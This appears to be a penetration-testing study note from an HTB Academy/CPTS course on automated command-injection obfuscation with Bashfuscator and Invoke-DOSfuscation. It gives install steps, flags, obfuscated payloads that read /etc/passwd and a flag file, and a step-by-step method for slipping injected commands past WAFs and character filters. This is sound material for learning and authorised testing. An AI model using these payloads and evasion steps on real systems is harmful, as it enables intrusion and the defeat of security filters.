# Section 10 — Evasion Tools

> Theory only. No lab.

---

## When to Reach for Automated Obfuscation

Manual techniques (Sections 5-9) are enough for most CPTS labs. Automated tools become useful when:
- Web Application Firewalls (WAFs) use machine-learning pattern matching that catches single-trick obfuscation
- The allowed character set is very small
- You need many variations to find which one bypasses the filter
- You want a complex payload without building it by hand

---

## Linux — Bashfuscator

GitHub: `https://github.com/Bashfuscator/Bashfuscator`

### Install
```bash
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
pip3 install setuptools==65
python3 setup.py install --user
```
> Clones the repo, pins `setuptools` to version 65 (required for compatibility), and installs the tool for the current user. Run once to set up.

### Basic usage
```bash
cd ./bashfuscator/bin/

# Simple — random obfuscation (may produce HUGE payloads)
./bashfuscator -c 'cat /etc/passwd'

# Constrained — minimal mutation, single layer
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
# Output ~100 chars, much more usable

# List available obfuscators
./bashfuscator -l
```
> `-c` specifies the command to obfuscate. `-s 1 -t 1 --no-mangling --layers 1` keeps the output compact and fast. `-l` lists all available obfuscation mutators. Swap `'cat /etc/passwd'` with any command.

### Flag reference

| Flag | Effect |
|------|--------|
| `-c CMD` | Command to obfuscate |
| `-s 1` | Min size (1-3) — keep small |
| `-t 1` | Min time (1-3) — fast execution |
| `--no-mangling` | Disable extra mangling layers |
| `--layers N` | Number of obfuscation passes |
| `--include-chars X` | Force certain chars to appear |
| `--exclude-chars X` | Avoid certain chars (great for filter bypass) |
| `--choose-mutators MUT1 MUT2` | Pick specific obfuscators |

### Sample output
```bash
$ ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
[+] Mutators used: Token/ForCode
[+] Payload:
eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"
```

Verify it works:
```bash
bash -c 'eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"'
# → /etc/passwd contents
```
> Run this locally in bash to confirm the obfuscated payload executes correctly before injecting it into the target. If it works locally, the same output will work on the server.

### Using output in command injection

The obfuscated payload often still contains characters that may be filtered (`$`, `{`, spaces). Use `--exclude-chars` to constrain the output:

```bash
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1 --exclude-chars " ;|&/"
```
> `--exclude-chars` tells Bashfuscator to avoid those characters in its output. List all chars the target filter blocks. URL-encode the result before injecting it.

URL-encode the result before injecting. Replace any remaining filtered chars using Section 6/7 tricks.

---

## Windows — Invoke-DOSfuscation

GitHub: `https://github.com/danielbohannon/Invoke-DOSfuscation`

Interactive PowerShell tool — also runs on Linux via `pwsh`.

### Install + launch
```bash
# On Linux
sudo apt install powershell    # or via pwsh package
pwsh
```
> Installs the PowerShell runtime on Kali. Run `pwsh` to start a PowerShell session, then proceed with the clone steps below.

```powershell
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation
```
> Clones the tool, imports its module, and launches the interactive menu. Run all four lines inside the `pwsh` session.

### Interactive workflow
```
Invoke-DOSfuscation> help

[*] BINARY      Obfuscated binary syntax for cmd.exe & powershell.exe
[*] ENCODING    Environment variable encoding (substring tricks)
[*] PAYLOAD     Obfuscated payload via DOSfuscation

Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
Invoke-DOSfuscation> encoding
Invoke-DOSfuscation\Encoding> 1     # pick obfuscation level
```
> `SET COMMAND` stores the command to obfuscate. `encoding` enters the environment-variable substring mode. Enter a number to pick the obfuscation level (1 = lightest).

### Sample output
```
typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt
```

This uses CMD's `%VAR:~start,length%` substring extraction to assemble the command from environment variable characters.

Verify in CMD:
```cmd
C:\htb> typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt
test_flag
```
> Each `%VAR:~start,length%` extracts one or more characters from an environment variable. CMD assembles them into the original command before executing. Run this in a local CMD window to verify it works before injecting.

### Three obfuscation modes
| Mode | Use |
|------|-----|
| BINARY | Obfuscate the binary name itself (`cmd.exe` → various tricks) |
| ENCODING | Substring extraction from env vars (most common) |
| PAYLOAD | Full payload-level transformation |

---

## Other Obfuscation Tools

| Tool | Platform | Notes |
|------|----------|-------|
| **Bashfuscator** | Linux | Best Linux choice — many mutators |
| **Invoke-DOSfuscation** | Windows | Interactive, mature |
| **Invoke-Obfuscation** | PowerShell | The classic PS obfuscator (Daniel Bohannon) |
| **wfuzz / Burp** | All | Not obfuscation but useful for fuzzing which obfuscation works |
| **Hyperion** | Windows binary | PE crypter — different use case (AV evasion) |
| **Veil-Evasion** | Multi | Payload generator with obfuscation |

---

## Workflow Pattern

```
1. Identify what filter blocks (Section 5)
2. Try manual obfuscation first (Sections 6-9)
3. If WAF/filter is too sophisticated → automated tool
4. Constrain tool output to your allowed character set (--exclude-chars)
5. Verify obfuscated command locally before injecting
6. URL-encode and inject
7. If still blocked, regenerate (tools are non-deterministic) or layer additional manual obfuscation
```

---

## Exam Notes

- HTB Academy labs are usually solvable with **manual** Section 6-9 techniques — automated tools are overkill
- For real engagements with mature WAFs (Cloudflare, AWS WAF, F5): start with Bashfuscator/DOSfuscation, iterate
- Bashfuscator output sizes can be huge (1664+ chars) — use `-s 1 -t 1 --no-mangling --layers 1` for compact output
- The `--exclude-chars` flag is critical when chaining with filter bypass — tells the tool which chars are already blocked
- DOSfuscation needs Windows or `pwsh` on Linux — install via apt `powershell` package on Kali
- Both tools are non-deterministic — re-run if first output doesn't bypass the filter
- For PowerShell obfuscation: also know Invoke-Obfuscation (companion to DOSfuscation by same author)
